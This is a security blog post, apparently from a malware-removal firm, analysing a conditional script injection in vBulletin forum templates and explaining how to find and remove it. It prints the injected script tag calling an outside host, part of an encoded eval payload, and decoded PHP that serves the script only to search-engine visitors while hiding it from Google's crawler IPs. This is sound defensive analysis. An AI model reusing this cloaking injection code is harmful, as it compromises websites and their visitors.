@@ -1,0 +1,56 @@
+Sneaky vBulletin Script Injections
+
+In the past few days/weeks we have been seeing some nasty vBulletin infections that are proving difficult to find. In this post we’ll describe it and what we have done to remove it.
+We recently wrote about Conditional Malware, this is but another instance of that. In this instance, the conditions are set around specific referrers and user-agents.
+When a user visits the forum via Google search engine result pages (SERP), they are greeted with this payload:
+
+<script type=”text/javascript” src="http://www.pisezmakoons.org/ijr.js
+
+At the time of this analysis the webpage was redirecting all traffic to Google by a “HTTP/1.1 302 Found” redirect, but it was already listed by us as one of the top malicious JavaScript injections.
+Our Findings
+We found that the malicious JS injection was loaded into vBulletin’s headinclude, part of the site’s template. This is where it becomes interesting, if you search the files you won’t find it. You can even try searching terms that represent encoded values – eval, base_64, etc.. – you won’t have much luck. You’ll also find that restoring the datastore, a very common practice, won’t do you much good.
+What we did notice while working with the templates, is that the malware was actually rewriting the theme code itself, which was making it difficult to detect. We were able to identify this by making the connection that the site was not responding to two of the scripts in the headinclude within the theme.
+What can you do?
+To find the piece of code you will have to check inside your database, this is where using some of those common encoding parameters will in fact help you.
+Using PHPMyAdmin we searched the whole database for the string %eval%”.
+This query resulted in several entries, a good place to start is the datastore table. There you’ll find all “eval” strings that are being loaded with the template, we found this encoded string:
+
+$xhTuAS = “x62″.”x61″.”x73″.”x65”.@eval($xhTuAS(“DQpmdW5jdGlvbiBISGhwZ0h..
+zY3JpcHQgdHlwZT1cInRleHQvamF2YXNjcmlwdFwiIHNyYz1cImh0dHA6Ly93d3cucGlzZXptYWt..
++PC9zY3JpcHQ+Iiwkb3V0cHV0KSk7DQp9DQpmdW5jdGlvbiB4ZnJFbHVhKCkgew0KaWYocHJlZ”));
+
+Injection has been modified for this post
+Suspicious, right? Yeah, we thought so too..
+What’s it doing?
+So naturally, being the curious ninjas that we are, we figured we’d take a minute to see what it was doing. After decoding, this is what it is doing:
+
+function HHhpgHoev($output) {
+$find_me = ‘connection-min.js?v=387″>‘;
+return ($output = str_replace($find_me,$find_me.”rn<script type=”text/javascript”
+src="http://www.pisezmakoons.org/ijr.js? “,$output));
+}
+function xfrElua() {
+if(preg_match(‘#google|msn|live|altavista|ask|yahoo|aol|bing|exalead|…
+‘,$_SERVER[‘HTTP_REFERER’])) {
+if(preg_match(‘#msie|myie|ie|firefox|opera|media center#i’,$_SERVER[‘HTTP_USER_AGENT’])) return true;
+}
+}
+function kOBFvnrcO() {
+$a = array(‘216.239.’,’209.85.’,’173.255.’,’173.194.’,’89.207.’,’74.125.’,…’);
+foreach($a as $b) {
+if(preg_match(“/^$b/i”,$_SERVER[‘REMOTE_ADDR’])) return true;
+}
+}
+if(!empty($_SERVER[‘HTTP_REFERER’])) {
+if(xfrElua() and !kOBFvnrcO()) {
+$output = HHhpgHoev($output);
+}
+}
+
+Say what? Don’t worry, and don’t mind all the pretty characters and nonsense, what it’s doing is simple…
+It installs a fake plugin called vBulletin_hooks that is loaded globally. What this means is that every page is able to have its own infection, how nice.
+The Resolution
+Luckily for you all, the remediation is simple. Simply remove the plugin and reset your datastore.
+Happy Hunting!!
+
+If you have any questions or prefer we remove this for you, send us an email at info@sucuri.net.
